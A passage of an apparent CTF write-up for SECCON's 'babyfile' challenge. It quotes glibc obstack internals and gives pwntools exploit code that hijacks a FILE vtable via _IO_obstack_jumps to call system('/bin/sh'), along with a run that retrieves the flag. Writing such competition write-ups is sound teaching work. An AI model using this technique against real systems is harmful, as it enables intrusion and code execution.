+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>
+<span class="p">};</span>
+</code></pre></div><p>Given when <code>_IO_SYNC</code> is called in <code>_IO_fflush</code> the second argument is <code>0x1</code>, we cannot call functions like <code>_IO_obstack_xsputn</code> that need buffer as arguments, that&rsquo;s the reason why we have to dig into <code>_IO_obstack_overflow</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span>
+<span class="nf">_IO_obstack_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">obstack</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_obstack_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">obstack</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+
+  <span class="cm">/* Make room for another character.  This might as well allocate a
+</span><span class="cm">     new chunk a memory and moves the old contents over.  */</span>
+  <span class="n">assert</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
+  <span class="n">obstack_1grow</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+
+  <span class="cm">/* Setup the buffer pointers again.  */</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">obstack_base</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">obstack_next_free</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="n">obstack_room</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>
+  <span class="cm">/* Now allocate the rest of the current chunk.  */</span>
+  <span class="n">obstack_blank_fast</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>The <code>struct _IO_obstack_file</code> is defined as follows:
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="01729ed5-16">
+    <span>struct _IO_obstack_file</span>
+    <span>...</span>
+  </label>
+  <input id="01729ed5-16" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">_IO_obstack_file</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="n">file</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">obstack</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div>
+  </div>
+</div>
+</p>
+<p>Which means right after the <code>vtable</code> field within the file stream should be a pointer toward a <code>struct obstack</code>.</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="b4a5bff5-17">
+    <span>struct obstack</span>
+    <span>...</span>
+  </label>
+  <input id="b4a5bff5-17" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">obstack</span>          <span class="cm">/* control current object in current chunk */</span>
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">chunk_size</span><span class="p">;</span>              <span class="cm">/* preferred size to allocate chunks in */</span>
+  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">chunk</span><span class="p">;</span> <span class="cm">/* address of current struct obstack_chunk */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">object_base</span><span class="p">;</span>            <span class="cm">/* address of object we are building */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">next_free</span><span class="p">;</span>              <span class="cm">/* where to add next char to current object */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">chunk_limit</span><span class="p">;</span>            <span class="cm">/* address of char after current chunk */</span>
+  <span class="k">union</span>
+  <span class="p">{</span>
+    <span class="n">PTR_INT_TYPE</span> <span class="n">tempint</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">tempptr</span><span class="p">;</span>
+  <span class="p">}</span> <span class="n">temp</span><span class="p">;</span>                       <span class="cm">/* Temporary for some macros.  */</span>
+  <span class="kt">int</span> <span class="n">alignment_mask</span><span class="p">;</span>           <span class="cm">/* Mask of alignment for each object. */</span>
+  <span class="cm">/* These prototypes vary based on &#39;use_extra_arg&#39;, and we use
+</span><span class="cm">     casts to the prototypeless function type in all assignments,
+</span><span class="cm">     but having prototypes here quiets -Wstrict-prototypes.  */</span>
+  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">chunkfun</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="kt">long</span><span class="p">);</span>
+  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">freefun</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="p">);</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">extra_arg</span><span class="p">;</span>              <span class="cm">/* first arg for chunk alloc/dealloc funcs */</span>
+  <span class="kt">unsigned</span> <span class="nl">use_extra_arg</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>     <span class="cm">/* chunk alloc/dealloc funcs take extra arg */</span>
+  <span class="kt">unsigned</span> <span class="nl">maybe_empty_object</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* There is a possibility that the current
+</span><span class="cm">				      chunk contains a zero-length object.  This
+</span><span class="cm">				      prevents freeing the chunk if we allocate
+</span><span class="cm">				      a bigger chunk to replace it. */</span>
+  <span class="kt">unsigned</span> <span class="nl">alloc_failed</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>      <span class="cm">/* No longer used, as we now call the failed
+</span><span class="cm">				     handler on error, but retained for binary
+</span><span class="cm">				     compatibility.  */</span>
+<span class="p">};</span>
+</code></pre></div>
+  </div>
+</div>
+
+<p>Once <code>obstack_1grow</code> is called, if <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>, <code>_obstack_newchunk</code> gets called.</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="dbb51532-18">
+    <span>obstack_1grow</span>
+    <span>...</span>
+  </label>
+  <input id="dbb51532-18" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp"># define obstack_1grow(OBSTACK, datum)					      \
+</span><span class="cp">  __extension__								      \
+</span><span class="cp">    ({ struct obstack *__o = (OBSTACK);				      \
+</span><span class="cp">       if (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)			      \
+</span><span class="cp">	 _obstack_newchunk (__o, 1);					      \
+</span><span class="cp">       obstack_1grow_fast (__o, datum);				      \
+</span><span class="cp">       (void) 0; })
+</span></code></pre></div>
+  </div>
+</div>
+
+<p><strong>Condition</strong>: <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>.</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="f89e64e3-19">
+    <span>_obstack_newchunk</span>
+    <span>...</span>
+  </label>
+  <input id="f89e64e3-19" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* Allocate a new current chunk for the obstack *H
+</span><span class="cm">   on the assumption that LENGTH bytes need to be added
+</span><span class="cm">   to the current object, or a new object of length LENGTH allocated.
+</span><span class="cm">   Copies any partial object from the end of the old chunk
+</span><span class="cm">   to the beginning of the new one.  */</span>
+
+<span class="kt">void</span>
+<span class="nf">_obstack_newchunk</span> <span class="p">(</span><span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">h</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">old_chunk</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">new_chunk</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">new_size</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">obj_size</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">next_free</span> <span class="o">-</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">already</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">object_base</span><span class="p">;</span>
+
+  <span class="cm">/* Compute size for new chunk.  */</span>
+  <span class="n">new_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">obj_size</span> <span class="o">+</span> <span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">obj_size</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk_size</span><span class="p">)</span>
+    <span class="n">new_size</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk_size</span><span class="p">;</span>
+
+  <span class="cm">/* Allocate and initialize the new chunk.  */</span>
+  <span class="n">new_chunk</span> <span class="o">=</span> <span class="n">CALL_CHUNKFUN</span> <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">new_size</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">new_chunk</span><span class="p">)</span>
+    <span class="p">(</span><span class="o">*</span><span class="n">obstack_alloc_failed_handler</span><span class="p">)();</span>
+  <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">new_chunk</span><span class="p">;</span>
+  <span class="n">new_chunk</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">old_chunk</span><span class="p">;</span>
+  <span class="n">new_chunk</span><span class="o">-&gt;</span><span class="n">limit</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk_limit</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">new_chunk</span> <span class="o">+</span> <span class="n">new_size</span><span class="p">;</span>
+
+  <span class="cm">/* Compute an aligned object_base in the new chunk */</span>
+  <span class="n">object_base</span> <span class="o">=</span>
+    <span class="n">__PTR_ALIGN</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">new_chunk</span><span class="p">,</span> <span class="n">new_chunk</span><span class="o">-&gt;</span><span class="n">contents</span><span class="p">,</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span><span class="p">);</span>
+
+  <span class="cm">/* Move the existing object to the new chunk.
+</span><span class="cm">     Word at a time is fast and is safe if the object
+</span><span class="cm">     is sufficiently aligned.  */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;=</span> <span class="n">DEFAULT_ALIGNMENT</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">obj_size</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">COPYING_UNIT</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+	   <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span>
+	<span class="p">((</span><span class="n">COPYING_UNIT</span> <span class="o">*</span><span class="p">)</span> <span class="n">object_base</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span>
+	  <span class="o">=</span> <span class="p">((</span><span class="n">COPYING_UNIT</span> <span class="o">*</span><span class="p">)</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span><span class="p">)[</span><span class="n">i</span><span class="p">];</span>
+      <span class="cm">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,
+</span><span class="cm">	 but that can cross a page boundary on a machine
+</span><span class="cm">	 which does not do strict alignment for COPYING_UNITS.  */</span>
+      <span class="n">already</span> <span class="o">=</span> <span class="n">obj_size</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">COPYING_UNIT</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">COPYING_UNIT</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="k">else</span>
+    <span class="n">already</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="cm">/* Copy remaining bytes one by one.  */</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">already</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">obj_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="n">object_base</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+
+  <span class="cm">/* If the object just copied was the only data in OLD_CHUNK,
+</span><span class="cm">     free that chunk and remove it from the chain.
+</span><span class="cm">     But not if that chunk might contain an empty object.  */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">maybe_empty_object</span>
+      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span>
+	  <span class="o">==</span> <span class="n">__PTR_ALIGN</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">old_chunk</span><span class="p">,</span> <span class="n">old_chunk</span><span class="o">-&gt;</span><span class="n">contents</span><span class="p">,</span>
+			  <span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span><span class="p">)))</span>
+    <span class="p">{</span>
+      <span class="n">new_chunk</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">old_chunk</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>
+      <span class="n">CALL_FREEFUN</span> <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">old_chunk</span><span class="p">);</span>
+    <span class="p">}</span>
+
+  <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span> <span class="o">=</span> <span class="n">object_base</span><span class="p">;</span>
+  <span class="n">h</span><span class="o">-&gt;</span><span class="n">next_free</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span> <span class="o">+</span> <span class="n">obj_size</span><span class="p">;</span>
+  <span class="cm">/* The new chunk certainly contains no empty object yet.  */</span>
+  <span class="n">h</span><span class="o">-&gt;</span><span class="n">maybe_empty_object</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp"># ifdef _LIBC
+</span><span class="cp"></span><span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_obstack_newchunk</span><span class="p">)</span>
+<span class="cp"># endif
+</span></code></pre></div>
+  </div>
+</div>
+
+<p>The interesting part of the function is the call to the <code>CALL_CHUNKFUN</code> macro that calls a raw <em>unencrypted</em> function pointer referenced by the <code>obstack</code> structure with either a controlled argument (<code>(h)-&gt;extra_arg</code>) or only with the size.</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="548d28af-20">
+    <span>CALL_FREEFUN</span>
+    <span>...</span>
+  </label>
+  <input id="548d28af-20" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp"># define CALL_FREEFUN(h, old_chunk) \
+</span><span class="cp">  do { \
+</span><span class="cp">      if ((h)-&gt;use_extra_arg)						      \
+</span><span class="cp">	(*(h)-&gt;freefun)((h)-&gt;extra_arg, (old_chunk));			      \
+</span><span class="cp">      else								      \
+</span><span class="cp">	(*(void (*)(void *))(h)-&gt;freefun)((old_chunk));		      \
+</span><span class="cp">    } while (0)
+</span></code></pre></div>
+  </div>
+</div>
+
+<p>If I summarize, to call <code>system(&quot;/bin/sh&quot;</code> we need to have:</p>
+<ul>
+<li><code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code></li>
+<li><code>(h)-&gt;freefun</code> = <code>&amp;system</code></li>
+<li><code>(h)-&gt;extra_arg</code> = <code>&amp;&quot;/bin/sh&quot;</code></li>
+<li><code>(h)-&gt;use_extra_arg</code> != 0</li>
+</ul>
+<p>Which gives:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">_IO_obstack_jumps</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x1E9260</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_IO_obstack_jumps: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+<span class="c1"># edit vtable =&gt; _IO_obstack_jumps</span>
+<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">9</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
+<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2a0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">obstack</span><span class="p">)</span>
+
+<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xff</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_read_base</span><span class="p">)</span>
+
+<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">chunkfun</span><span class="p">)</span> <span class="c1"># fn ptr, system</span>
+<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">extra_arg</span><span class="p">)</span> <span class="c1"># arg</span>
+<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="kc">True</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">use_extra_arg</span><span class="p">)</span>
+
+<span class="n">fflush</span><span class="p">()</span>
+<span class="c1"># system(&#34;/bin/sh&#34;)</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h1 id="profit">
+        PROFIT
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<p>After optimizing a lot my exploit (my french connection sucks), here we are:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nasm@off:~/Documents/pwn/seccon/babyfile$ <span class="nb">time</span> python3 exploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>babyfile.seccon.games <span class="nv">PORT</span><span class="o">=</span><span class="m">3157</span>
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/seccon/babyfile/chall&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span>+<span class="o">]</span> Opening connection to babyfile.seccon.games on port 3157: Done
+<span class="o">[</span>*<span class="o">]</span> libc: 0x7fe2bc538000
+<span class="o">[</span>*<span class="o">]</span> heap: 0x55fd27776000
+<span class="o">[</span>*<span class="o">]</span> _IO_obstack_jumps: 0x7fe2bc721260
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+SECCON<span class="o">{</span>r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3<span class="o">}</span>
+<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
+$
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h1 id="annexes">
+        Annexes
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#annexes" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Annexes" href="#annexes">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="549f44b0-21">
+    <span>Full exploit code</span>
+    <span>...</span>
+  </label>
+  <input id="549f44b0-21" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <p>Final exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="c1"># this exploit was generated via</span>
+<span class="c1"># 1) pwntools</span>
+<span class="c1"># 2) ctfmate</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">pwn</span>
+
+
+<span class="c1"># Set up pwntools for the correct architecture</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;chall&#39;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-2.31.so&#39;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="c1"># pwn.context.timeout = 1000</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
